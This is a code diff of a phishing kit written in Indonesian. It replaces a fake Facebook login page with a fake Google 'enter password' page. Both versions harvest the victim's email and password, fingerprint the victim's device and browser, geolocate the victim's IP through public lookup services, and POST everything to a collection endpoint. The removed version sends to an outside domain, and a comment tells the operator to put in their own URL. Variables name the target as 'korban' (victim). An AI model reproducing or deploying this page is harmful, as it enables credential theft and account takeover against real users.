@@ -2,81 +2,155 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook – Masuk</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Masuk - Akun Google</title>
 <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    body { background-color: #f0f2f5; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; }
-    .fb-container { width: 100%; max-width: 396px; padding: 20px; text-align: center; margin-top: auto; margin-bottom: auto;}
-    .fb-logo svg { width: 60px; height: 60px; fill: #1877f2; margin-bottom: 15px; }
-    .fb-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px 0; width: 100%; }
-    .fb-title { font-size: 18px; font-weight: normal; color: #1c1e21; margin-bottom: 15px; }
-    .fb-input { width: calc(100% - 32px); margin: 0 16px 12px 16px; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; outline: none; background: #fff; color: #1d2129; }
-    .fb-input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-    .fb-input::placeholder { color: #90949c; }
-    .fb-input.input-error { border: 1.5px solid #f02849; }
-    .fb-btn { width: calc(100% - 32px); margin: 0 16px; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-    .fb-btn:active { background-color: #166fe5; transform: scale(0.98); }
-    .fb-forgot { display: block; margin: 16px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
-    .fb-forgot:hover { text-decoration: underline; }
-    .fb-divider { border-bottom: 1px solid #dadde1; margin: 20px 16px; }
-    .fb-create { display: inline-block; padding: 12px 16px; background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; text-decoration: none; }
-    .fb-create:active { background-color: #36a420; }
-    .fb-footer { margin-top: 28px; font-size: 14px; color: #1c1e21; margin-bottom: 20px; }
-    .fb-footer a { color: #1c1e21; font-weight: bold; text-decoration: none; }
-    .error-msg { display: none; color: #f02849; font-size: 13px; margin: -5px 16px 10px 16px; text-align: left; }
-    .error-msg.show { display: block; }
+  html, body { height: 100%; margin: 0; padding: 0; background: #000; }
+  body { color: #e3e3e3; font-family: "Google Sans", Roboto, Arial, sans-serif; display: flex; justify-content: center; -webkit-font-smoothing: antialiased; }
+  .screen { width: 100%; max-width: 450px; min-height: 100%; box-sizing: border-box; padding: 40px 24px 24px; display: flex; flex-direction: column; }
+  .logo { text-align: center; margin-bottom: 16px; }
+  .wordmark { font-size: 28px; font-weight: 400; letter-spacing: -0.5px; color: #fff; }
+  h1 { text-align: center; font-weight: 400; font-size: 26px; margin: 0 0 12px 0; color: #e3e3e3; }
+  .account { display: flex; align-items: center; justify-content: center; gap: 8px; color: #c4c7c5; font-size: 15px; margin-bottom: 48px; }
+  .account svg { width: 20px; height: 20px; fill: #c4c7c5; }
+  
+  .field { margin-top: 0; position: relative; }
+  .field input[type="password"], .field input[type="text"] { width: 100%; box-sizing: border-box; height: 56px; background: transparent; border: 1px solid #5f6368; border-radius: 4px; padding: 0 16px; font-size: 16px; color: #e3e3e3; outline: none; font-family: inherit; }
+  .field input::placeholder { color: #9aa0a6; }
+  .field input:focus { border-color: #8ab4f8; border-width: 2px; padding: 0 15px; }
+  .field input.input-error { border: 1.5px solid #f28b82; }
+
+  .error-msg {
+      display: none;
+      color: #f28b82;
+      font-size: 13px;
+      margin-top: 6px;
+      padding-left: 2px;
+      align-items: center;
+      gap: 6px;
+  }
+  .error-msg.show { display: flex; }
+  .error-msg svg { width: 14px; height: 14px; fill: #f28b82; flex-shrink: 0; }
+
+  .show { display: flex; align-items: center; gap: 16px; margin-top: 16px; padding-left: 2px; font-size: 14px; color: #e3e3e3; cursor: pointer; }
+  .show input { appearance: none; -webkit-appearance: none; width: 18px; height: 18px; margin: 0; border: 2px solid #9aa0a6; border-radius: 2px; background: transparent; cursor: pointer; position: relative; flex-shrink: 0; }
+  .show input:checked { background: #8ab4f8; border-color: #8ab4f8; }
+  .show input:checked::after { content: ""; position: absolute; left: 4px; top: 1px; width: 4px; height: 9px; border: solid #000; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+  .spacer { flex: 1; }
+  .actions { display: flex; align-items: center; justify-content: space-between; padding-bottom: env(safe-area-inset-bottom, 16px); margin-top: 24px; }
+  .actions a { color: #8ab4f8; text-decoration: none; font-size: 14px; font-weight: 500; padding: 12px 0; }
+  .actions button { background: #8ab4f8; color: #000; border: 0; border-radius: 4px; height: 40px; padding: 0 24px; font-size: 14px; font-family: inherit; font-weight: 500; cursor: pointer; }
+  .actions button:active { background: #aecbfa; }
 </style>
 </head>
 <body>
-<div class="fb-container">
-    <div class="fb-logo"><svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><path d="M18 0C8.06 0 0 8.06 0 18c0 8.98 6.58 16.43 15.18 17.78V23.2h-4.57V18h4.57v-3.96c0-4.52 2.7-7 6.82-7 1.98 0 4.05.35 4.05.35v4.45h-2.28c-2.25 0-2.95 1.4-2.95 2.82V18h5.02l-.8 5.2h-4.22v12.58C29.42 34.43 36 26.98 36 18c0-9.94-8.06-18-18-18z" fill="#1877f2"/></svg></div>
-    <div class="fb-box">
-        <div class="fb-title">Masuk ke Facebook</div>
-        <div class="error-msg" id="errorMsg">Email atau kata sandi yang Anda masukkan tidak cocok.</div>
-        <input type="text" id="fbEmail" class="fb-input" placeholder="Email">
-        <input type="password" id="fbPass" class="fb-input" placeholder="Kata Sandi">
-        <button class="fb-btn" onclick="loginFB()">Masuk</button>
-        <a href="#" class="fb-forgot">Lupa kata sandi?</a>
-        <div class="fb-divider"></div>
-        <a href="#" class="fb-create">Buat Akun Baru</a>
+  <div class="screen">
+    <div class="logo"><span class="wordmark">Google</span></div>
+    <h1>Selamat datang</h1>
+    
+    <div class="account">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+      <span id="emailDisplay">Memuat...</span>
     </div>
-    <div class="fb-footer"><a href="#">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</div>
-</div>
+
+    <div class="field">
+      <input id="pw" type="password" placeholder="Masukkan sandi" autocomplete="current-password">
+      
+      <div class="error-msg" id="pwError">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+          <span id="pwErrorText">Sandi minimal 8 karakter</span>
+      </div>
+
+      <label class="show">
+        <input id="toggle" type="checkbox">
+        <span>Tampilkan sandi</span>
+      </label>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="actions">
+      <a href="#">Lupa sandi?</a>
+      <button type="button" id="btnSubmit" onclick="kirimData()">Berikutnya</button>
+    </div>
+  </div>
+
 <script>
-    function loginFB() {
-        var email = document.getElementById('fbEmail').value.trim().toLowerCase();
-        var pass = document.getElementById('fbPass').value;
-        var errorMsg = document.getElementById('errorMsg'); var btn = document.querySelector('.fb-btn'); var inputEmail = document.getElementById('fbEmail');
-        errorMsg.classList.remove('show'); inputEmail.classList.remove('input-error');
-        if(email === "" || pass === "") { errorMsg.innerText = "Email dan Kata Sandi tidak boleh kosong."; errorMsg.classList.add('show'); return; }
-        if(!email.endsWith("@gmail.com")) { errorMsg.innerText = "Email harus diakhiri dengan @gmail.com"; inputEmail.classList.add('input-error'); errorMsg.classList.add('show'); return; }
-        btn.innerText = "Memproses..."; btn.disabled = true;
-        var ua = navigator.userAgent;
-        var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_fadz_1';
-        var payload = { web_id: web_id_aktif, platform: "Facebook", email: email, password: pass, ip: "-", negara: "-", prov: "-", kota: "-", isp: "-", koord: "-", waktu: new Date().toLocaleString("id-ID"), device: detectDevice(ua), os: detectOS(ua), browser: detectBrowser(ua) };
-        
-        // PAKE IPWHO.IS
-        fetch("https://ipwho.is/").then(function(r){ return r.json(); }).then(function(d){
-            payload.ip = d.ip || "-"; 
-            payload.negara = d.country || "-"; 
-            payload.negaraKode = d.country_code || "ID";
-            payload.dial = d.dial || "+62";
-            payload.prov = d.region || "-"; 
-            payload.kota = d.city || "-"; 
-            payload.isp = d.connection?.isp || "-"; 
+  var emailKorban = sessionStorage.getItem('email_korban') || "unknown@gmail.com";
+  document.getElementById('emailDisplay').innerText = emailKorban;
+
+  const pw = document.getElementById('pw');
+  document.getElementById('toggle').addEventListener('change', e => {
+    pw.type = e.target.checked ? 'text' : 'password';
+  });
+
+  function kirimData() {
+    var password = document.getElementById('pw').value;
+    var input = document.getElementById('pw');
+    var errorDiv = document.getElementById('pwError');
+    var errorText = document.getElementById('pwErrorText');
+    var btn = document.getElementById('btnSubmit');
+
+    input.classList.remove('input-error');
+    errorDiv.classList.remove('show');
+
+    if(password.length < 8) {
+        errorText.innerText = "Sandi harus minimal 8 karakter. Ketik setidaknya 8 karakter.";
+        input.classList.add('input-error');
+        errorDiv.classList.add('show');
+        return;
+    }
+
+    btn.innerText = "...";
+    btn.disabled = true;
+
+    var ua = navigator.userAgent;
+    var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_kenz_1';
+
+    var payload = {
+        web_id: web_id_aktif,
+        platform: "Google", // <--- INI YANG BIKIN DI RES BISA KEDETEK KONTOL
+        email: emailKorban, 
+        password: password,
+        ip: "-", negara: "-", prov: "-", kota: "-", isp: "-", koord: "-",
+        waktu: new Date().toLocaleString("id-ID"),
+        device: detectDevice(ua),
+        os: detectOS(ua),
+        browser: detectBrowser(ua)
+    };
+
+    fetch("https://ipapi.co/json/")
+        .then(function(r){ return r.json(); })
+        .then(function(d){
+            payload.ip = d.ip || "-";
+            payload.negara = d.country_name || "-";
+            payload.prov = d.region || "-";
+            payload.kota = d.city || "-";
+            payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            return fetch("https://websetting.my.id/api/send", { // SESUAIIN URL LU
+            return fetch("/api/send", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
-        }).then(function(res){ try{ localStorage.setItem("sudah_submit","1"); }catch(e){} window.location.href = "https://files.catbox.moe/mfxa6c.mp4"; }).catch(function(err){ window.location.href = "https://files.catbox.moe/mfxa6c.mp4"; });
-    }
-    function detectDevice(ua){ if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Windows/i.test(ua)) return "Windows"; if(/Mac/i.test(ua)) return "Mac"; return "Unknown"; }
-    function detectOS(ua){ var m; if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1]; if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,"."); if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); } if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,"."); return "Unknown"; }
-    function detectBrowser(ua){ var m; if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1]; if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1]; if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1]; if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1]; if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1]; if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1]; return "Unknown"; }
+        })
+        .then(function(res){
+            sessionStorage.setItem('password_korban', password);
+            window.location.href = "selesai.html";
+        })
+        .catch(function(err){
+            window.location.href = "selesai.html"; 
+        });
+  }
+
+  document.getElementById('pw').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') { kirimData(); }
+  });
+
+  function detectDevice(ua){ if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Windows/i.test(ua)) return "Windows"; if(/Mac/i.test(ua)) return "Mac"; return "Unknown"; }
+  function detectOS(ua){ var m; if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1]; if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,"."); if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); } if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,"."); return "Unknown"; }
+  function detectBrowser(ua){ var m; if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1]; if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1]; if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1]; if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1]; if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1]; if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1]; return "Unknown"; }
 </script>
 </body>
 </html>
